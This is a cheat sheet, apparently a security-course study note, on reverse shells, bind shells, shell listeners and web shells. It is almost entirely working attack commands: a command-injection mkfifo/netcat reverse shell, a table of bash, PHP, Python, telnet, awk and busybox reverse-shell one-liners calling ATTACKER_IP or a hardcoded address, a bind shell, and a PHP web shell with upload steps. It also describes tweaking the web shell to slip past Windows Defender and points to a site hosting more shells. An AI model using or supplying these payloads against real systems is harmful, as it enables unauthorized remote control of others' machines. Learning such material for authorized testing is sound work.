# Reverse Shell

Commonly referred to as the "connect back shell," it allows an attacker to execute commands remotely after the target connects back.

### How Reverse Shells Work

- Set up a netcat listener
- Gaining reverse shell access through payload
- Attacker receives the shell

### Set Up a Netcat Listener

- **Example Usage**: `nc -lvnp 443` 
  - `nc` = netcat
  - `-l` = indicates netcat to listen or wait for a connection
  - `v` = verbose output
  - `n` = prevents connections from using DNS for lookup (therefore, no hostname resolved)
  - `-p` = indicates the port that will be used, common examples: 53 (DNS), 80 (HTTP), 8080 (HTTP), 443 (HTTPS), 139 (NetBIOS Session Service), 445 (SMB) 
  - This is run on the **TERMINAL**
  
### Gaining Reverse Shell Access

- A payload is required for gaining access to the reverse shell. In the example below, we will use a **pipe reverse shell**.
- **Example Usage**:  `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
  - `rm -f /tmp/f`: removes any existing pipe file in /tmp/f to ensure the creation of a new pipe file without conflicts
  - `mkfifo /tmp/f`: creates a named pipe/FIFO at /tmp/f. These allow for 2-way communication between processes.
  - `cat /tmp/f`: reads data from the named pipe
  - `| sh -i 2>&1`: the data read is piped to a shell instance (`sh -i`) which allows the attacker to execute commands interactively. `2>&1` redirects standard error (STDERR) to standard output (STDOUT), ensuring error messages get sent back to attacker.
  - `| nc ATTACKER_IP ATTACKER PORT`: that is further piped to the attacker's IP and on the attacker's port through netcat
  - `>/tmp/f`: sends the output of the commands back into the named pipe, allowing bi-directional communication
  - This is run using **COMMAND INJECTION**, semicolons added on both sides of the command. (; COMMAND;)

## Shell Payloads

| Payload Name | Payload Command | Description |
| :--- | :--- | :--- |
| **Bash** | | |
| Normal Bash Reverse Shell | `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1` | This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error. |
| Bash Read Line Reverse Shell | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done` | This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket. |
| Bash With File Descriptor 196 Reverse Shell | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196` | This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection. |
| Bash With File Descriptor 5 Reverse Shell | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5` | Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection. |
| **PHP** | | |
| PHP Reverse Shell Using the exec Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'` | This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output. |
| PHP Reverse Shell Using the shell_exec Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'` | Similar to the previous command, but uses the shell_exec function. |
| PHP Reverse Shell Using the system Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'` | This reverse shell employs the system function, which executes the command and outputs the result to the browser. |
| PHP Reverse Shell Using the passthru Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'` | The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data. |
| PHP Reverse Shell Using the popen Function | `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'` | This reverse shell uses popen to open a process file pointer, allowing the shell to be executed. |
| **Python** | | These require `python -c` to be run, as indicated by the placeholder `PY -C` |
| Python Reverse Shell by Exporting Environment Variables | `export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'` | This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output. |
| Python Reverse Shell Using the subprocess Module | `PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` | This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command. |
| Short Python Reverse Shell | `PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` | This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2(). |
| **Others** | | |
| Telnet | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF \| sh 1>$TF` | This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. |
| AWK | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" \|& s; s \|& getline c; if(c){ while ((c \|& getline) > 0) print $0 \|& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` | This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection. |
| BusyBox | `busybox nc ATTACKER_IP 443 -e sh` | This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker. |

# Bind Shell

Bind shells bind a port on the compromised system and listen for connections. When the connection occurs, it exposes the shell session so the attacker can execute commands remotely. Privy to detection since it needs to remain active and listen for connections.

### How Bind Shells Work

- Setting up the Bind Shell on the Target
- Attacker connects to the Bind Shell

### Setting up the Bind Shell

- A payload is required.
- **Example Usage**: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
  - `rm -f /tmp/f`: removes any existing pipe file in /tmp/f to ensure the creation of a new pipe file without conflicts
  - `mkfifo /tmp/f`: creates a named pipe/FIFO at /tmp/f. These allow for 2-way communication between processes.
  - `cat /tmp/f`: reads data from the named pipe
  - `| bash -i 2>&1`: the data read is piped to a shell instance (`bash -i`) which allows the attacker to execute commands interactively. `2>&1` redirects STDERR to STDOUT, ensuring error messages get sent back to attacker.
  - `| nc -l 0.0.0.0 8080`: starts netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to the port. **Note**: Ports below 1024 will require netcat to be executed with elevated privileges.
  - `>/tmp/f`: sends the output of the commands back into the named pipe, allowing bi-directional communication

### Attacker Connects to Bind Shell

- **Example Usage**: `nc -nv TARGET_IP 8080`
  - `nc` = netcat
  - `-n` = disables DNS resolution, making netcat act faster
  - `v` = verbose output
  - `TARGET_IP` = IP address of machine where the bind shell is running
  - `8080` = port number on which bind shell is running

# Shell Listeners

There are other tools apart from `netcat` that can allow us to listen to shells.

- **Rlwrap**
  - Usage: `rlwrap nc -lvnp 443` (Here, the rlwrap wraps the nc)
  - uses a GNU readline library to provide editing keyboard and history, allowing use of arrow keys and history while using netcat.
- **Ncat**
  - Usage: `ncat -lvnp 4444` / `ncat --ssl -lvnp 4444`
  - Improved version by NMAP project, provides additional features like encryption (SSL).
- **Socat**
  - Usage: `socat -d -d TCP-LISTEN:443 STDOUT`
    - `-d` = for verbose output, 2 -d's means more verbose
    - `TCP-LISTEN:443` = creates a TCP listener on port 443
    - `STDOUT` = directs any incoming data to terminal
  - allows you to create a socket connection between 2 data sources or 2 different hosts 

# Web Shells

A script written in the language supported by the compromised web server, executes commands through the web server itself. Languages supported include: **PHP, JSP, ASP, and even simple CGI scripts**

**Example Usage**:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd' /* omitted for documentation */]);
}
?>
```
- The above shell can be saved with a .php extension, for example: shell.php
- Then it can be uploaded onto the web server by exploiting vulnerabilities such as *Unrestricted File Upload, File Inclusion, Command Injection*, among others.
- After the web shell is deployed on the server, it can be accessed via browser through URL: http://victim.com/uploads/shell.php
- Since the code says we need to provide a GET method and the value of the variable `cmd` should contain the command the attacker wants to execute, the URL to execute commands should be http://victim.com/uploads/shell.php?cmd=whoami where it executes the command `whoami`. 
- *Note: The comment /\*omitted for documentation\*/ was added as Windows defender kept flagging this file as malicious due to the example web shell. The comment changed the byte pattern so now it no longer detects it as malicious. The Example Usage is just for educational purpose.*

**Existing Web Shells Online**:
- p0wny-shell: minimalistic single-file PHP web shell, allows remote command execution
- b374k shell: feature-rich PHP web shell, with file management and command execution
- c99 shell: well-known and robust PHP web shell with extensive functionalities
- You can find more web shells at r57shell.net/index.php